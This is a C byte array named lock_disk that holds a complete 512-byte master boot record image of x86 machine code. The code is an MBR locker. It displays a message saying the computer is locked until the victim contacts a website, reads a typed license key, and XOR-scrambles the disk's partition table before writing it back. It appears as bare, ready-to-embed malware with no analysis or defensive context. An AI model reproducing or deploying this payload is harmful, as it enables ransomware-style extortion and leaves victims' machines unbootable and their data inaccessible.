unsigned char lock_disk[512] = {
	0x8C, 0xC8, 0x8E, 0xD8, 0x8E, 0xD0, 0x8E, 0xC0, 0xBC, 0x00, 0x01, 0xBD, 0xFE, 0x7C, 0xB9, 0x6C,
	0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xB8, 0x83, 0xC0, 0x40, 0x8E,
	0xD8, 0x31, 0xC9, 0x31, 0xDB, 0x31, 0xC0, 0xCD, 0x16, 0x3C, 0x08, 0x74, 0x1B, 0x3C, 0x0D, 0x74,
	0x26, 0xB4, 0x02, 0x88, 0x07, 0x88, 0x67, 0x01, 0x30, 0xC0, 0x88, 0x47, 0x02, 0x83, 0xC3, 0x02,
	0x41, 0x2E, 0x89, 0x0E, 0xFD, 0x7C, 0xEB, 0xDD, 0x83, 0xEB, 0x02, 0x49, 0x2E, 0x89, 0x0E, 0xFD,
	0x7C, 0x31, 0xC0, 0x89, 0x07, 0xEB, 0xCE, 0x8C, 0xC8, 0x8E, 0xC0, 0x31, 0xDB, 0x3E, 0x8A, 0x07,
	0x3C, 0x43, 0x75, 0x73, 0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x61, 0x75, 0x69, 0x83, 0xC3,
	0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x4D, 0x75, 0x5F, 0x83, 0xC3, 0x02, 0xB1, 0xFF, 0xB5, 0x00, 0x2E,
	0x88, 0x2E, 0xFC, 0x7C, 0x3E, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0A, 0x2E, 0x30, 0x06, 0xFC, 0x7C,
	0x83, 0xC3, 0x02, 0xE2, 0xEF, 0xB8, 0x00, 0x7E, 0x8E, 0xC0, 0x31, 0xDB, 0xB4, 0x02, 0xB2, 0x80,
	0xB0, 0x01, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x03, 0xCD, 0x13, 0xBB, 0xBD, 0x01, 0x30, 0xED, 0x26,
	0x88, 0x2F, 0xBB, 0xBE, 0x01, 0xB1, 0x40, 0x26, 0x8A, 0x07, 0x2E, 0x32, 0x06, 0xFC, 0x7C, 0x26,
	0x88, 0x07, 0x43, 0xE2, 0xF2, 0x31, 0xDB, 0xB4, 0x03, 0xB2, 0x80, 0xB0, 0x01, 0xB6, 0x00, 0xB5,
	0x00, 0xB1, 0x01, 0xCD, 0x13, 0xEB, 0x1C, 0xBB, 0x00, 0xB8, 0x83, 0xC3, 0x6C, 0xB0, 0x58, 0x26,
	0x88, 0x07, 0x2E, 0x8B, 0x0E, 0xFD, 0x7C, 0x31, 0xC0, 0x89, 0x07, 0x83, 0xC3, 0x02, 0xE2, 0xF9,
	0xE9, 0x0D, 0xFF, 0xB8, 0xFF, 0xFF, 0x50, 0xB8, 0x00, 0x00, 0x50, 0xCB, 0x00, 0x00, 0x59, 0x6F,
	0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x77, 0x61, 0x73, 0x20,
	0x6C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x2C, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x61, 0x63, 0x74, 0x20,
	0x77, 0x77, 0x77, 0x2E, 0x64, 0x6F, 0x6D, 0x61, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x20, 0x6F, 0x72,
	0x20, 0x69, 0x74, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x62, 0x65, 0x20, 0x6C, 0x6F, 0x63, 0x6B,
	0x65, 0x64, 0x20, 0x66, 0x6F, 0x72, 0x65, 0x76, 0x65, 0x72, 0x20, 0x20, 0x59, 0x4F, 0x55, 0x52,
	0x20, 0x4C, 0x49, 0x43, 0x45, 0x4E, 0x53, 0x45, 0x3A, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61,
	0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,
	0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x55, 0xAA
};
